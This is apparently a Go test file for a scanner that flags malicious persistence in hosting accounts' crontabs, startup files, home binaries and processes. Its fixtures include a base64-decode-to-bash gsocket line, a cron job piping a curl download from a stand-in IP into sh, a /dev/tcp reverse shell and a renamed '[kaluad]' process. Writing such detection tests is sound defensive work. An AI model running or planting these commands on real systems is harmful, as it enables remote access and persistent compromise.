package scan

import (
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
)

// The line gsocket's installer adds to a crontab and to .profile and
// .bashrc (from a compromised site, the payload shortened).
const gsocketLine = `{ echo L3Vzci9iaW4vcGtpbGwgLTAgLVUxMDY5IGRlZnVuY3Q=|base64 -d|bash;} 2>/dev/null #1b5b324a50524e47 >/dev/random # seed prng defunct-kernel`

func TestMatchPersistence(t *testing.T) {
	for _, c := range []struct {
		content string
		want    []string
	}{
		{"# DO NOT REMOVE THIS LINE. SEED PRNG. #defunct-kernel\n" + gsocketLine, []string{"decoded-shell", "gsocket"}},
		{"0 * * * * " + gsocketLine, []string{"decoded-shell", "gsocket"}},
		{"*/5 * * * * curl -fsSL http://203.0.113.9/x.sh | sh", []string{"download-shell"}},
		{"bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", []string{"dev-tcp"}},
		{`(TERM=xterm exec -a '[kaluad]' ~/.config/htop/defunct)`, []string{"renamed-process"}},

		// What a site user's crontab and startup files normally hold.
		{"PATH=\"/sites/x/.local/bin:/usr/bin:/bin\"\n#Ansible: x\n*/1 * * * * cd /sites/x/files/; /usr/local/bin/wp cron event run --due-now >/dev/null 2>&1", nil},
		{"[ -x /usr/bin/lesspipe ] && eval \"$(SHELL=/bin/sh lesspipe)\"\nalias ll='ls -alF'\nif [ -f ~/.bash_aliases ]; then . ~/.bash_aliases; fi", nil},
		{"0 3 * * * wp db export - | gzip > ~/backups/db.sql.gz", nil},
	} {
		got, _ := matchPersistence([]byte(c.content))
		if !slices.Equal(got, c.want) {
			t.Errorf("%q\nmatched %q, want %q", c.content, got, c.want)
		}
	}
}

func TestWalkHome(t *testing.T) {
	home := t.TempDir()
	site := filepath.Join(home, "files")
	writeFile(t, home, ".profile", "# ~/.profile\n"+gsocketLine)
	writeFile(t, home, ".bashrc", "alias ll='ls -alF'")
	writeFile(t, site, "index.php", "<?php")
	for _, p := range []string{".config/htop/defunct", ".cache/tool", "logs/x", "files/wp-content/bin"} {
		writeFile(t, home, p, "\x7fELF\x02\x01\x01")
		if err := os.Chmod(filepath.Join(home, p), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	writeFile(t, home, ".cursor-server/bin/linux-x64/d867/node", "\x7fELF\x02\x01\x01")
	if err := os.Chmod(filepath.Join(home, ".cursor-server/bin/linux-x64/d867/node"), 0o755); err != nil {
		t.Fatal(err)
	}
	writeFile(t, home, ".local/bin/composer", "#!/usr/bin/env php")
	if err := os.Chmod(filepath.Join(home, ".local/bin/composer"), 0o755); err != nil {
		t.Fatal(err)
	}

	var got []string
	for _, e := range WalkHome(home, site) {
		got = append(got, e.Path+" "+strings.Join(e.Persist, ",")+map[bool]string{true: " binary"}[e.Binary])
	}
	slices.Sort(got)
	want := []string{"~/.bashrc ", "~/.config/htop/defunct  binary", "~/.cursor-server/bin/linux-x64/d867/node  binary", "~/.profile decoded-shell,gsocket"}
	if !slices.Equal(got, want) {
		t.Fatalf("home entries = %q, want %q", got, want)
	}

	// An editor's server is low, a planted program high.
	var findings []string
	for _, f := range EvaluateFirst(WalkHome(home, site), uint32(os.Getuid()), func(uint32) string { return "u" }) {
		if f.Rule == RuleHomeBinary {
			findings = append(findings, f.Severity+" "+f.Path)
		}
	}
	slices.Sort(findings)
	if want := []string{"high ~/.config/htop/defunct", "low ~/.cursor-server/bin/linux-x64/d867/node"}; !slices.Equal(findings, want) {
		t.Fatalf("home-binary findings = %q, want %q", findings, want)
	}
}

// The first scan with the user checks reports what's malicious, not every
// startup file and crontab as new; later changes are reported.
func TestUserEntriesAfterUpgrade(t *testing.T) {
	home := t.TempDir()
	writeFile(t, home, ".profile", gsocketLine)
	writeFile(t, home, ".bashrc", "alias ll='ls -alF'")
	owner := uint32(os.Getuid())
	cur := WalkHome(home, filepath.Join(home, "files"))
	cur = append(cur, Entry{Path: CrontabPath, UID: owner, SHA256: "c1"}, Entry{Path: ProcessPrefix + "[kaluad]", UID: owner, Process: true, PersistDetail: "pid 1 running ~/.config/htop/defunct"})

	prev := &State{Entries: map[string]Entry{}}
	SeedUserEntries(prev, cur)
	var got []string
	for _, f := range Evaluate(prev.Entries, cur, owner, func(uint32) string { return "u" }) {
		got = append(got, f.Severity+" "+f.Rule+" "+f.Path)
	}
	slices.Sort(got)
	want := []string{"high disguised-process process/[kaluad]", "high persistence ~/.profile"}
	if !slices.Equal(got, want) {
		t.Fatalf("findings after the upgrade = %q, want %q", got, want)
	}

	base := NewState(cur)
	base.UserChecked = true
	writeFile(t, home, ".bashrc", "alias ll='ls -alF'\nexport PATH=$PATH:~/bin")
	later := append(WalkHome(home, filepath.Join(home, "files")), Entry{Path: CrontabPath, UID: owner, SHA256: "c2"}, cur[len(cur)-1])
	got = nil
	for _, f := range Evaluate(base.Entries, later, owner, func(uint32) string { return "u" }) {
		got = append(got, f.Severity+" "+f.Rule+" "+f.Path)
	}
	slices.Sort(got)
	want = []string{"medium startup-change crontab", "medium startup-change ~/.bashrc"}
	if !slices.Equal(got, want) {
		t.Fatalf("findings for changes = %q, want %q", got, want)
	}
}

func TestUserProcesses(t *testing.T) {
	proc := t.TempDir()
	old := procRoot
	procRoot = proc
	t.Cleanup(func() { procRoot = old })
	home := "/sites/example.com"
	add := func(pid, uid, cmdline, exe string) {
		t.Helper()
		dir := filepath.Join(proc, pid)
		writeFile(t, dir, "status", "Name:\tx\nUid:\t"+uid+"\t"+uid+"\t"+uid+"\t"+uid+"\n")
		writeFile(t, dir, "cmdline", cmdline)
		// Kernel threads have no program.
		if exe == "" {
			return
		}
		if err := os.Symlink(exe, filepath.Join(dir, "exe")); err != nil {
			t.Fatal(err)
		}
	}
	add("101", "1069", "[kaluad]\x00", home+"/.config/htop/defunct")
	add("102", "1069", "php-fpm: pool example\x00", "/usr/sbin/php-fpm8.3")
	add("103", "1069", "php\x00/usr/local/bin/wp\x00cron\x00", "/usr/bin/php8.3")
	add("104", "1069", "./miner\x00", "/tmp/.x/miner")
	add("105", "0", "[kworker/0:1]\x00", "")
	add("106", "1070", "[kaluad]\x00", "/sites/other/.config/htop/defunct")
	add("107", "1069", "node\x00", home+"/.cursor-server/bin/linux-x64/d867/node")

	var got []string
	for _, e := range UserProcesses(1069, home) {
		got = append(got, e.Path)
	}
	slices.Sort(got)
	if want := []string{"process/./miner", "process/[kaluad]", "process/node"}; !slices.Equal(got, want) {
		t.Fatalf("processes = %q, want %q", got, want)
	}

	// A connected editor's process is low; a disguised one stays high.
	got = nil
	for _, f := range EvaluateFirst(UserProcesses(1069, home), 1069, func(uint32) string { return "u" }) {
		got = append(got, f.Severity+" "+f.Path)
	}
	slices.Sort(got)
	if want := []string{"high process/./miner", "high process/[kaluad]", "low process/node"}; !slices.Equal(got, want) {
		t.Fatalf("process findings = %q, want %q", got, want)
	}
}
